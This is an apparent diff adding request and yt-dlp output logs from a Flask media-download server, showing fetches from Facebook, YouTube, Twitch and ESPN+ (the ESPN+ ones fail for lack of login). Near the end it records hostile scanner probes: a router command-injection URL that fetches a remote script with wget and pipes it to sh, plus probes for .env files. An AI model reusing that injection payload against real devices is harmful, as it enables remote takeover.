+127.0.0.1 - - [16/May/2024 10:16:13] "GET /series.json HTTP/1.0" 200 -
+[generic] Extracting URL: https://scontent-sea1-1.xx.fbcdn.net/v/t42.1790-2/10000000_1204294653891443_5795129656153610659_n...WNkT0qog&oe=664AD983
+[generic] 10000000_1204294653891443_5795129656153610659_n.mp4?_nc_cat=104&ccb=1-7&_nc_sid=55d0d3&efg=eyJ2ZW5jb2RlX3RhZyI6InN2ZV9zZCIsInZpZGVvX2lkIjoyNTQ1NzIyNTMzMDU5MjUyM30=&_nc_eui2=AeEEqk_vPjWSayU1yfOXCq8sPsGrFNjNwSY-wasU2M3BJml6Of_ixSlgIb8tSYoFgH0ONHIkOyFz3L2IuZZcL3xu&_nc_ohc=G6H4mPQAuyIQ7kNvgEP3VHO&_nc_rml=0&_nc_ht=scontent-sea1-1: Downloading webpage
+[redirect] Following redirect to https://video.xx.fbcdn.net/v/t42.1790-2/10000000_1204294653891443_5795129656153610659_n.mp4?_nc_cat=104&ccb=1-7&_nc_sid=55d0d3&efg=eyJ2ZW5jb2RlX3RhZyI6InN2ZV9zZCIsInZpZGVvX2lkIjoyNTQ1NzIyNTMzMDU5MjUyM30%3D&_nc_eui2=AeEEqk_vPjWSayU1yfOXCq8sPsGrFNjNwSY-wasU2M3BJml6Of_ixSlgIb8tSYoFgH0ONHIkOyFz3L2IuZZcL3xu&_nc_ohc=G6H4mPQAuyIQ7kNvgEP3VHO&_nc_rml=0&_nc_ht=scontent-sea1-1.xx&oh=00_AYB8djH-CBjo2WxeqGvI_vUM7bDuTZCHAfkjm8WNkT0qog&oe=664AD983
+[generic] Extracting URL: https://video.xx.fbcdn.net/v/t42.1790-2/10000000_1204294653891443_5795129656153610659_n.mp4?_nc_c...WNkT0qog&oe=664AD983
+[generic] 10000000_1204294653891443_5795129656153610659_n.mp4?_nc_cat=104&ccb=1-7&_nc_sid=55d0d3&efg=eyJ2ZW5jb2RlX3RhZyI6InN2ZV9zZCIsInZpZGVvX2lkIjoyNTQ1NzIyNTMzMDU5MjUyM30=&_nc_eui2=AeEEqk_vPjWSayU1yfOXCq8sPsGrFNjNwSY-wasU2M3BJml6Of_ixSlgIb8tSYoFgH0ONHIkOyFz3L2IuZZcL3xu&_nc_ohc=G6H4mPQAuyIQ7kNvgEP3VHO&_nc_rml=0&_nc_ht=scontent-sea1-1: Downloading webpage
+127.0.0.1 - - [16/May/2024 10:16:16] "POST /get_media HTTP/1.0" 200 -
+127.0.0.1 - - [16/May/2024 10:16:25] "GET /series.json HTTP/1.0" 200 -
+[youtube] Extracting URL: https://www.youtube.com/watch?v=Cn5LLdQyq3E
+[youtube] Cn5LLdQyq3E: Downloading webpage
+[youtube] Cn5LLdQyq3E: Downloading ios player API JSON
+[youtube] Cn5LLdQyq3E: Downloading android player API JSON
+WARNING: [youtube] Skipping player responses from android clients (got player responses for video "aQvGIIdgFDM" instead of "Cn5LLdQyq3E")
+127.0.0.1 - - [16/May/2024 10:16:31] "GET /series.json HTTP/1.0" 200 -
+[youtube] Cn5LLdQyq3E: Downloading m3u8 information
+127.0.0.1 - - [16/May/2024 10:16:31] "POST /get_media HTTP/1.0" 200 -
+[twitch:vod] Extracting URL: https://www.twitch.tv/videos/2145582269
+[twitch:vod] 2145582269: Downloading stream metadata GraphQL
+[twitch:vod] 2145582269: Downloading video access token GraphQL
+[twitch:vod] 2145582269: Downloading m3u8 information
+[twitch:vod] 2145582269: Downloading storyboard metadata JSON
+127.0.0.1 - - [16/May/2024 10:16:34] "POST /get_media HTTP/1.0" 200 -
+127.0.0.1 - - [16/May/2024 10:16:39] "GET /series.json HTTP/1.0" 200 -
+[twitch:vod] Extracting URL: https://www.twitch.tv/videos/2145582269
+[twitch:vod] 2145582269: Downloading stream metadata GraphQL
+[twitch:vod] 2145582269: Downloading video access token GraphQL
+[twitch:vod] 2145582269: Downloading m3u8 information
+[twitch:vod] 2145582269: Downloading storyboard metadata JSON
+127.0.0.1 - - [16/May/2024 10:16:42] "POST /get_media HTTP/1.0" 200 -
+127.0.0.1 - - [16/May/2024 10:16:45] "GET /series.json HTTP/1.0" 200 -
+[WatchESPN] Extracting URL: https://www.espn.com/espnplus/player/_/id/2f816cdb-a5e6-4c00-9c5d-d81bbea903a1#bucketId=7294
+[WatchESPN] 2f816cdb-a5e6-4c00-9c5d-d81bbea903a1: Downloading JSON metadata
+ERROR: [WatchESPN] 2f816cdb-a5e6-4c00-9c5d-d81bbea903a1: This video is only available for registered users. Use --cookies-from-browser or --cookies for the authentication. See  https://github.com/yt-dlp/yt-dlp/wiki/FAQ#how-do-i-pass-cookies-to-yt-dlp  for how to manually pass cookies
+127.0.0.1 - - [16/May/2024 10:16:47] "POST /get_media HTTP/1.0" 500 -
+[WatchESPN] Extracting URL: https://www.espn.com/espnplus/player/_/id/2f816cdb-a5e6-4c00-9c5d-d81bbea903a1#bucketId=7294
+[WatchESPN] 2f816cdb-a5e6-4c00-9c5d-d81bbea903a1: Downloading JSON metadata
+ERROR: [WatchESPN] 2f816cdb-a5e6-4c00-9c5d-d81bbea903a1: This video is only available for registered users. Use --cookies-from-browser or --cookies for the authentication. See  https://github.com/yt-dlp/yt-dlp/wiki/FAQ#how-do-i-pass-cookies-to-yt-dlp  for how to manually pass cookies
+127.0.0.1 - - [16/May/2024 10:16:49] "POST /get_media HTTP/1.0" 500 -
+[WatchESPN] Extracting URL: https://www.espn.com/espnplus/player/_/id/2f816cdb-a5e6-4c00-9c5d-d81bbea903a1#bucketId=7294
+[WatchESPN] 2f816cdb-a5e6-4c00-9c5d-d81bbea903a1: Downloading JSON metadata
+ERROR: [WatchESPN] 2f816cdb-a5e6-4c00-9c5d-d81bbea903a1: This video is only available for registered users. Use --cookies-from-browser or --cookies for the authentication. See  https://github.com/yt-dlp/yt-dlp/wiki/FAQ#how-do-i-pass-cookies-to-yt-dlp  for how to manually pass cookies
+127.0.0.1 - - [16/May/2024 10:16:51] "POST /get_media HTTP/1.0" 500 -
+[WatchESPN] Extracting URL: https://www.espn.com/espnplus/player/_/id/2f816cdb-a5e6-4c00-9c5d-d81bbea903a1#bucketId=7294
+[WatchESPN] 2f816cdb-a5e6-4c00-9c5d-d81bbea903a1: Downloading JSON metadata
+ERROR: [WatchESPN] 2f816cdb-a5e6-4c00-9c5d-d81bbea903a1: This video is only available for registered users. Use --cookies-from-browser or --cookies for the authentication. See  https://github.com/yt-dlp/yt-dlp/wiki/FAQ#how-do-i-pass-cookies-to-yt-dlp  for how to manually pass cookies
+127.0.0.1 - - [16/May/2024 10:16:53] "POST /get_media HTTP/1.0" 500 -
+[generic] Extracting URL: https://scontent-sea1-1.xx.fbcdn.net/v/t42.1790-2/10000000_1204294653891443_5795129656153610659_n...WNkT0qog&oe=664AD983
+[generic] 10000000_1204294653891443_5795129656153610659_n.mp4?_nc_cat=104&ccb=1-7&_nc_sid=55d0d3&efg=eyJ2ZW5jb2RlX3RhZyI6InN2ZV9zZCIsInZpZGVvX2lkIjoyNTQ1NzIyNTMzMDU5MjUyM30=&_nc_eui2=AeEEqk_vPjWSayU1yfOXCq8sPsGrFNjNwSY-wasU2M3BJml6Of_ixSlgIb8tSYoFgH0ONHIkOyFz3L2IuZZcL3xu&_nc_ohc=G6H4mPQAuyIQ7kNvgEP3VHO&_nc_rml=0&_nc_ht=scontent-sea1-1: Downloading webpage
+[redirect] Following redirect to https://video.xx.fbcdn.net/v/t42.1790-2/10000000_1204294653891443_5795129656153610659_n.mp4?_nc_cat=104&ccb=1-7&_nc_sid=55d0d3&efg=eyJ2ZW5jb2RlX3RhZyI6InN2ZV9zZCIsInZpZGVvX2lkIjoyNTQ1NzIyNTMzMDU5MjUyM30%3D&_nc_eui2=AeEEqk_vPjWSayU1yfOXCq8sPsGrFNjNwSY-wasU2M3BJml6Of_ixSlgIb8tSYoFgH0ONHIkOyFz3L2IuZZcL3xu&_nc_ohc=G6H4mPQAuyIQ7kNvgEP3VHO&_nc_rml=0&_nc_ht=scontent-sea1-1.xx&oh=00_AYB8djH-CBjo2WxeqGvI_vUM7bDuTZCHAfkjm8WNkT0qog&oe=664AD983
+[generic] Extracting URL: https://video.xx.fbcdn.net/v/t42.1790-2/10000000_1204294653891443_5795129656153610659_n.mp4?_nc_c...WNkT0qog&oe=664AD983
+[generic] 10000000_1204294653891443_5795129656153610659_n.mp4?_nc_cat=104&ccb=1-7&_nc_sid=55d0d3&efg=eyJ2ZW5jb2RlX3RhZyI6InN2ZV9zZCIsInZpZGVvX2lkIjoyNTQ1NzIyNTMzMDU5MjUyM30=&_nc_eui2=AeEEqk_vPjWSayU1yfOXCq8sPsGrFNjNwSY-wasU2M3BJml6Of_ixSlgIb8tSYoFgH0ONHIkOyFz3L2IuZZcL3xu&_nc_ohc=G6H4mPQAuyIQ7kNvgEP3VHO&_nc_rml=0&_nc_ht=scontent-sea1-1: Downloading webpage
+127.0.0.1 - - [16/May/2024 10:18:35] "POST /get_media HTTP/1.0" 200 -
+127.0.0.1 - - [16/May/2024 10:18:59] "GET /series.json HTTP/1.0" 200 -
+[twitch:vod] Extracting URL: https://www.twitch.tv/videos/2145582269
+[twitch:vod] 2145582269: Downloading stream metadata GraphQL
+[twitch:vod] 2145582269: Downloading video access token GraphQL
+[twitch:vod] 2145582269: Downloading m3u8 information
+[twitch:vod] 2145582269: Downloading storyboard metadata JSON
+127.0.0.1 - - [16/May/2024 10:19:03] "POST /get_media HTTP/1.0" 200 -
+127.0.0.1 - - [16/May/2024 10:19:06] "GET /series.json HTTP/1.0" 200 -
+[WatchESPN] Extracting URL: https://www.espn.com/espnplus/player/_/id/2f816cdb-a5e6-4c00-9c5d-d81bbea903a1#bucketId=7294
+[WatchESPN] 2f816cdb-a5e6-4c00-9c5d-d81bbea903a1: Downloading JSON metadata
+ERROR: [WatchESPN] 2f816cdb-a5e6-4c00-9c5d-d81bbea903a1: This video is only available for registered users. Use --cookies-from-browser or --cookies for the authentication. See  https://github.com/yt-dlp/yt-dlp/wiki/FAQ#how-do-i-pass-cookies-to-yt-dlp  for how to manually pass cookies
+127.0.0.1 - - [16/May/2024 10:19:29] "POST /get_media HTTP/1.0" 500 -
+[WatchESPN] Extracting URL: https://www.espn.com/espnplus/player/_/id/2f816cdb-a5e6-4c00-9c5d-d81bbea903a1#bucketId=7294
+[WatchESPN] 2f816cdb-a5e6-4c00-9c5d-d81bbea903a1: Downloading JSON metadata
+ERROR: [WatchESPN] 2f816cdb-a5e6-4c00-9c5d-d81bbea903a1: This video is only available for registered users. Use --cookies-from-browser or --cookies for the authentication. See  https://github.com/yt-dlp/yt-dlp/wiki/FAQ#how-do-i-pass-cookies-to-yt-dlp  for how to manually pass cookies
+127.0.0.1 - - [16/May/2024 10:19:32] "POST /get_media HTTP/1.0" 500 -
+[WatchESPN] Extracting URL: https://www.espn.com/espnplus/player/_/id/2f816cdb-a5e6-4c00-9c5d-d81bbea903a1#bucketId=7294
+[WatchESPN] 2f816cdb-a5e6-4c00-9c5d-d81bbea903a1: Downloading JSON metadata
+ERROR: [WatchESPN] 2f816cdb-a5e6-4c00-9c5d-d81bbea903a1: This video is only available for registered users. Use --cookies-from-browser or --cookies for the authentication. See  https://github.com/yt-dlp/yt-dlp/wiki/FAQ#how-do-i-pass-cookies-to-yt-dlp  for how to manually pass cookies
+127.0.0.1 - - [16/May/2024 10:19:34] "POST /get_media HTTP/1.0" 500 -
+[WatchESPN] Extracting URL: https://www.espn.com/espnplus/player/_/id/2f816cdb-a5e6-4c00-9c5d-d81bbea903a1#bucketId=7294
+[WatchESPN] 2f816cdb-a5e6-4c00-9c5d-d81bbea903a1: Downloading JSON metadata
+ERROR: [WatchESPN] 2f816cdb-a5e6-4c00-9c5d-d81bbea903a1: This video is only available for registered users. Use --cookies-from-browser or --cookies for the authentication. See  https://github.com/yt-dlp/yt-dlp/wiki/FAQ#how-do-i-pass-cookies-to-yt-dlp  for how to manually pass cookies
+127.0.0.1 - - [16/May/2024 10:19:36] "POST /get_media HTTP/1.0" 500 -
+[twitch:vod] Extracting URL: https://www.twitch.tv/videos/2145582269
+[twitch:vod] 2145582269: Downloading stream metadata GraphQL
+[twitch:vod] 2145582269: Downloading video access token GraphQL
+[twitch:vod] 2145582269: Downloading m3u8 information
+[twitch:vod] 2145582269: Downloading storyboard metadata JSON
+127.0.0.1 - - [16/May/2024 10:19:38] "POST /get_media HTTP/1.0" 200 -
+127.0.0.1 - - [16/May/2024 10:19:41] "GET /series.json HTTP/1.0" 200 -
+[twitch:vod] Extracting URL: https://www.twitch.tv/videos/2145582269
+[twitch:vod] 2145582269: Downloading stream metadata GraphQL
+[twitch:vod] 2145582269: Downloading video access token GraphQL
+[twitch:vod] 2145582269: Downloading m3u8 information
+[twitch:vod] 2145582269: Downloading storyboard metadata JSON
+127.0.0.1 - - [16/May/2024 10:19:45] "POST /get_media HTTP/1.0" 200 -
+127.0.0.1 - - [16/May/2024 10:19:47] "GET /series.json HTTP/1.0" 200 -
+127.0.0.1 - - [16/May/2024 10:20:05] "GET /series.json HTTP/1.0" 200 -
+[twitch:vod] Extracting URL: https://www.twitch.tv/videos/2145582269
+[twitch:vod] 2145582269: Downloading stream metadata GraphQL
+[twitch:vod] 2145582269: Downloading video access token GraphQL
+[twitch:vod] 2145582269: Downloading m3u8 information
+[twitch:vod] 2145582269: Downloading storyboard metadata JSON
+127.0.0.1 - - [16/May/2024 10:20:13] "POST /get_media HTTP/1.0" 200 -
+127.0.0.1 - - [16/May/2024 10:23:11] "GET /series.json HTTP/1.0" 200 -
+[generic] Extracting URL: https://scontent-sea1-1.xx.fbcdn.net/v/t42.1790-2/10000000_1204294653891443_5795129656153610659_n...WNkT0qog&oe=664AD983
+[generic] 10000000_1204294653891443_5795129656153610659_n.mp4?_nc_cat=104&ccb=1-7&_nc_sid=55d0d3&efg=eyJ2ZW5jb2RlX3RhZyI6InN2ZV9zZCIsInZpZGVvX2lkIjoyNTQ1NzIyNTMzMDU5MjUyM30=&_nc_eui2=AeEEqk_vPjWSayU1yfOXCq8sPsGrFNjNwSY-wasU2M3BJml6Of_ixSlgIb8tSYoFgH0ONHIkOyFz3L2IuZZcL3xu&_nc_ohc=G6H4mPQAuyIQ7kNvgEP3VHO&_nc_rml=0&_nc_ht=scontent-sea1-1: Downloading webpage
+[redirect] Following redirect to https://video.xx.fbcdn.net/v/t42.1790-2/10000000_1204294653891443_5795129656153610659_n.mp4?_nc_cat=104&ccb=1-7&_nc_sid=55d0d3&efg=eyJ2ZW5jb2RlX3RhZyI6InN2ZV9zZCIsInZpZGVvX2lkIjoyNTQ1NzIyNTMzMDU5MjUyM30%3D&_nc_eui2=AeEEqk_vPjWSayU1yfOXCq8sPsGrFNjNwSY-wasU2M3BJml6Of_ixSlgIb8tSYoFgH0ONHIkOyFz3L2IuZZcL3xu&_nc_ohc=G6H4mPQAuyIQ7kNvgEP3VHO&_nc_rml=0&_nc_ht=scontent-sea1-1.xx&oh=00_AYB8djH-CBjo2WxeqGvI_vUM7bDuTZCHAfkjm8WNkT0qog&oe=664AD983
+[generic] Extracting URL: https://video.xx.fbcdn.net/v/t42.1790-2/10000000_1204294653891443_5795129656153610659_n.mp4?_nc_c...WNkT0qog&oe=664AD983
+[generic] 10000000_1204294653891443_5795129656153610659_n.mp4?_nc_cat=104&ccb=1-7&_nc_sid=55d0d3&efg=eyJ2ZW5jb2RlX3RhZyI6InN2ZV9zZCIsInZpZGVvX2lkIjoyNTQ1NzIyNTMzMDU5MjUyM30=&_nc_eui2=AeEEqk_vPjWSayU1yfOXCq8sPsGrFNjNwSY-wasU2M3BJml6Of_ixSlgIb8tSYoFgH0ONHIkOyFz3L2IuZZcL3xu&_nc_ohc=G6H4mPQAuyIQ7kNvgEP3VHO&_nc_rml=0&_nc_ht=scontent-sea1-1: Downloading webpage
+127.0.0.1 - - [16/May/2024 10:23:15] "POST /get_media HTTP/1.0" 200 -
+127.0.0.1 - - [16/May/2024 10:28:01] "GET /series.json HTTP/1.0" 200 -
+[twitch:vod] Extracting URL: https://www.twitch.tv/videos/2145582269
+[twitch:vod] 2145582269: Downloading stream metadata GraphQL
+[twitch:vod] 2145582269: Downloading video access token GraphQL
+[twitch:vod] 2145582269: Downloading m3u8 information
+[twitch:vod] 2145582269: Downloading storyboard metadata JSON
+127.0.0.1 - - [16/May/2024 10:28:08] "POST /get_media HTTP/1.0" 200 -
+127.0.0.1 - - [16/May/2024 10:30:18] "GET /series.json HTTP/1.0" 200 -
+[generic] Extracting URL: https://scontent-sea1-1.xx.fbcdn.net/v/t42.1790-2/10000000_1204294653891443_5795129656153610659_n...WNkT0qog&oe=664AD983
+[generic] 10000000_1204294653891443_5795129656153610659_n.mp4?_nc_cat=104&ccb=1-7&_nc_sid=55d0d3&efg=eyJ2ZW5jb2RlX3RhZyI6InN2ZV9zZCIsInZpZGVvX2lkIjoyNTQ1NzIyNTMzMDU5MjUyM30=&_nc_eui2=AeEEqk_vPjWSayU1yfOXCq8sPsGrFNjNwSY-wasU2M3BJml6Of_ixSlgIb8tSYoFgH0ONHIkOyFz3L2IuZZcL3xu&_nc_ohc=G6H4mPQAuyIQ7kNvgEP3VHO&_nc_rml=0&_nc_ht=scontent-sea1-1: Downloading webpage
+[redirect] Following redirect to https://video.xx.fbcdn.net/v/t42.1790-2/10000000_1204294653891443_5795129656153610659_n.mp4?_nc_cat=104&ccb=1-7&_nc_sid=55d0d3&efg=eyJ2ZW5jb2RlX3RhZyI6InN2ZV9zZCIsInZpZGVvX2lkIjoyNTQ1NzIyNTMzMDU5MjUyM30%3D&_nc_eui2=AeEEqk_vPjWSayU1yfOXCq8sPsGrFNjNwSY-wasU2M3BJml6Of_ixSlgIb8tSYoFgH0ONHIkOyFz3L2IuZZcL3xu&_nc_ohc=G6H4mPQAuyIQ7kNvgEP3VHO&_nc_rml=0&_nc_ht=scontent-sea1-1.xx&oh=00_AYB8djH-CBjo2WxeqGvI_vUM7bDuTZCHAfkjm8WNkT0qog&oe=664AD983
+[generic] Extracting URL: https://video.xx.fbcdn.net/v/t42.1790-2/10000000_1204294653891443_5795129656153610659_n.mp4?_nc_c...WNkT0qog&oe=664AD983
+[generic] 10000000_1204294653891443_5795129656153610659_n.mp4?_nc_cat=104&ccb=1-7&_nc_sid=55d0d3&efg=eyJ2ZW5jb2RlX3RhZyI6InN2ZV9zZCIsInZpZGVvX2lkIjoyNTQ1NzIyNTMzMDU5MjUyM30=&_nc_eui2=AeEEqk_vPjWSayU1yfOXCq8sPsGrFNjNwSY-wasU2M3BJml6Of_ixSlgIb8tSYoFgH0ONHIkOyFz3L2IuZZcL3xu&_nc_ohc=G6H4mPQAuyIQ7kNvgEP3VHO&_nc_rml=0&_nc_ht=scontent-sea1-1: Downloading webpage
+127.0.0.1 - - [16/May/2024 10:30:24] "POST /get_media HTTP/1.0" 200 -
+ * Serving Flask app 'app'
+ * Debug mode: off
+WARNING: This is a development server. Do not use it in a production deployment. Use a production WSGI server instead.
+ * Running on all addresses (0.0.0.0)
+ * Running on http://127.0.0.1:5001
+ * Running on http://135.148.27.168:5001
+Press CTRL+C to quit
+127.0.0.1 - - [16/May/2024 10:34:34] "GET / HTTP/1.0" 200 -
+127.0.0.1 - - [16/May/2024 10:34:50] "GET /series.json HTTP/1.0" 200 -
+127.0.0.1 - - [16/May/2024 10:34:53] "GET /cgi-bin/luci/;stok=/locale?form=country&operation=write&country=$(id>`wget+http://103.149.86.202/t+-O-+|+sh`) HTTP/1.0" 404 -
+127.0.0.1 - - [16/May/2024 10:36:20] "GET / HTTP/1.0" 200 -
+127.0.0.1 - - [16/May/2024 10:36:59] "GET / HTTP/1.0" 200 -
+127.0.0.1 - - [16/May/2024 10:40:05] "GET /.env HTTP/1.0" 404 -
+127.0.0.1 - - [16/May/2024 10:40:06] "POST / HTTP/1.0" 405 -
+127.0.0.1 - - [16/May/2024 10:41:24] "GET /favicon.ico HTTP/1.0" 404 -
+127.0.0.1 - - [16/May/2024 10:45:47] "GET /manage/account/login HTTP/1.0" 404 -
